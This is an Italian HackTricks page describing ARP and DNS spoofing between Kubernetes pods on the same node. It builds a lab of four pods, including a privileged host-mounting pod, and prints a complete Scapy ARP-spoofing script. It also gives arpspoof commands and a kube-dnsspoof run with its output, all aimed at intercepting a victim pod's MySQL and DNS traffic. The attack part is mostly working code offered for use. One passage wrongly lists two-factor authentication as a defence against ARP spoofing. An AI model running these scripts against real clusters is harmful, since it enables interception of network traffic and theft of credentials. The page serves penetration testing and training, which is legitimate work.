# Attacchi di rete su Kubernetes

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## Introduzione

In Kubernetes, si osserva che un comportamento predefinito permette l'instaurazione di connessioni tra **tutti i container presenti sullo stesso nodo**. Questo avviene indipendentemente dalle distinzioni dei namespace. Tale connettivit√† si estende fino al **Livello 2** (Ethernet). Di conseguenza, questa configurazione potenzialmente espone il sistema a vulnerabilit√†. In particolare, apre la possibilit√† per un **container malintenzionato** di eseguire un **attacco di ARP spoofing** contro altri container situati sullo stesso nodo. Durante tale attacco, il container malintenzionato pu√≤ intercettare o modificare in modo ingannevole il traffico di rete destinato ad altri container.

Gli attacchi di ARP spoofing coinvolgono l'**attaccante che invia messaggi ARP falsificati** (Address Resolution Protocol) su una rete locale. Ci√≤ comporta l'associazione dell'**indirizzo MAC dell'attaccante con l'indirizzo IP di un computer o server legittimo sulla rete**. Dopo l'esecuzione di successo di un tale attacco, l'attaccante pu√≤ intercettare, modificare o addirittura interrompere i dati in transito. L'attacco viene eseguito al Livello 2 del modello OSI, motivo per cui la connettivit√† predefinita in Kubernetes a questo livello solleva preoccupazioni sulla sicurezza.

Nello scenario verranno create 4 macchine:

* ubuntu-pe: Macchina privilegiata per sfuggire al nodo e verificare le metriche (non necessaria per l'attacco)
* **ubuntu-attack**: Container **malintenzionato** nel namespace predefinito
* **ubuntu-victim**: Macchina **vittima** nel namespace kube-system
* **mysql**: Macchina **vittima** nel namespace predefinito
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Networking di base di Kubernetes

Se desideri ulteriori dettagli sugli argomenti di networking introdotti qui, consulta i riferimenti.

### ARP

In generale, **la rete da pod a pod all'interno del nodo** √® disponibile tramite un **bridge** che collega tutti i pod. Questo bridge √® chiamato "**cbr0**". (Alcuni plugin di rete installeranno il proprio bridge.) Il **cbr0 pu√≤ anche gestire la risoluzione ARP** (Address Resolution Protocol). Quando un pacchetto in entrata arriva a cbr0, pu√≤ risolvere l'indirizzo MAC di destinazione utilizzando ARP.

Questo fatto implica che, per impostazione predefinita, **ogni pod in esecuzione nello stesso nodo** sar√† in grado di **comunicare** con qualsiasi altro pod nello stesso nodo (indipendentemente dal namespace) a livello ethernet (livello 2).

{% hint style="warning" %}
Pertanto, √® possibile eseguire attacchi di **ARP Spoofing tra i pod nello stesso nodo**.
{% endhint %}

### DNS

Negli ambienti Kubernetes di solito troverai 1 (o pi√π) **servizi DNS in esecuzione** di solito nel namespace kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
Nelle informazioni precedenti puoi vedere qualcosa di interessante, l'**IP del servizio** √® **10.96.0.10** ma l'**IP del pod** in esecuzione del servizio √® **172.17.0.2**.

Se controlli l'indirizzo DNS all'interno di qualsiasi pod, troverai qualcosa del genere:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Tuttavia, il pod **non sa** come raggiungere quell'**indirizzo** perch√© l'intervallo del pod in questo caso √® 172.17.0.10/26.

Pertanto, il pod invier√† le **richieste DNS all'indirizzo 10.96.0.10** che verr√† **tradotto** dal cbr0 in **172.17.0.2**.

{% hint style="warning" %}
Ci√≤ significa che una **richiesta DNS** di un pod verr√† sempre inviata al **bridge** per **tradurre** l'**IP del servizio all'IP del punto finale**, anche se il server DNS si trova nella stessa sottorete del pod.

Sapendo questo, e sapendo che gli **attacchi ARP sono possibili**, un **pod** in un nodo sar√† in grado di **intercettare il traffico** tra **ogni pod** nella **sottorete** e il **bridge** e **modificare** le **risposte DNS** dal server DNS (**DNS Spoofing**).

Inoltre, se il **server DNS** si trova nello **stesso nodo dell'attaccante**, l'attaccante pu√≤ **intercettare tutte le richieste DNS** di qualsiasi pod nel cluster (tra il server DNS e il bridge) e modificare le risposte.
{% endhint %}

## ARP Spoofing nei pod nello stesso nodo

Il nostro obiettivo √® **rubare almeno la comunicazione da ubuntu-victim a mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof

ARPSpoof √® una tecnica di attacco che sfrutta il protocollo ARP (Address Resolution Protocol) per intercettare e manipolare il traffico di rete all'interno di una rete locale. Questo attacco viene utilizzato per eseguire attacchi di tipo Man-in-the-Middle (MITM), in cui l'attaccante si posiziona tra due host legittimi e intercetta e modifica il traffico tra di essi.

L'attacco ARPSpoof funziona inviando falsi pacchetti ARP alla rete locale, in cui l'attaccante si finge da una delle macchine legittime e invia un pacchetto ARP con il proprio indirizzo MAC associato all'indirizzo IP della vittima. Questo fa s√¨ che il traffico destinato alla vittima venga inviato all'attaccante anzich√© al suo destinatario legittimo.

Per eseguire con successo un attacco ARPSpoof, l'attaccante deve essere in grado di intercettare e inoltrare correttamente il traffico tra le due macchine legittime. Ci√≤ pu√≤ essere fatto configurando il proprio sistema come un router o utilizzando strumenti come Ettercap o Bettercap.

L'attacco ARPSpoof pu√≤ essere utilizzato per vari scopi, tra cui il furto di informazioni sensibili, l'iniezione di pacchetti dannosi o la manipolazione del traffico di rete. √à importante notare che questo attacco pu√≤ essere rilevato e prevenuto utilizzando tecniche di sicurezza come l'uso di VLAN, l'implementazione di autenticazione a due fattori e l'uso di crittografia per proteggere il traffico di rete.
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Come gi√† accennato, se **comprometti un pod nello stesso nodo del pod del server DNS**, puoi **fare MitM** con **ARPSpoofing** sul **bridge e sul pod DNS** e **modificare tutte le risposte DNS**.

Hai a disposizione un **ottimo strumento** e **tutorial** per testare questo su [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

Nel nostro scenario, **scarica** lo **strumento** nel pod dell'attaccante e crea un \*\*file chiamato `hosts` \*\* con i **domini** che desideri **spoofare**, come:
```
cat hosts
google.com. 1.1.1.1
```
Esegui l'attacco alla macchina ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
Se provi a creare il tuo script di DNS spoofing, se **modifichi solo la risposta DNS** non funzioner√†, perch√© la risposta avr√† un **IP sorgente** l'indirizzo IP del **pod malevolo** e non verr√† accettata.\
√à necessario generare un **nuovo pacchetto DNS** con l'**IP sorgente** del **DNS** a cui la vittima invia la richiesta DNS (che √® qualcosa come 172.16.0.2, non 10.96.0.10, che √® l'IP del servizio DNS di K8s e non l'IP del server DNS, maggiori informazioni in introduzione).
{% endhint %}

## Catturare il Traffico

Lo strumento [**Mizu**](https://github.com/up9inc/mizu) √® un semplice ma potente visualizzatore di traffico API per Kubernetes che ti consente di **visualizzare tutte le comunicazioni API** tra i microservizi per aiutarti a debuggare e risolvere i problemi di regressione.\
Installa agenti nei pod selezionati e raccoglie le informazioni sul traffico, mostrandotele in un server web. Tuttavia, avrai bisogno di elevate autorizzazioni K8s per farlo (e non √® molto stealthy).

## Riferimenti

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguimi** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
